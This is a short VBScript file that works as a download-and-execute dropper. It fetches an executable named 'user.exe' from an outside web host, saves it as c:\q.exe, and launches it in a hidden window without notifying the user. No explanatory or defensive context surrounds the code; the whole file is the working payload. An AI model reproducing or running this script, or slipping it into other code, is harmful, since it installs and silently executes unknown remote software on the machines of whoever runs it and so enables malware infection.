Dim BD
Dim xml
Set xml = CreateObject("Microsoft.XMLHTTP")
xml.Open "GET", "http://www.bozonline.freeserve.co.uk/user.exe", False 
xml.Send
BD = xml.ResponseBody
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
BinaryStream.Open
BinaryStream.Write BD
BinaryStream.SaveToFile "c:\q.exe", adSaveCreateOverWrite
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\q.exe", 0, false
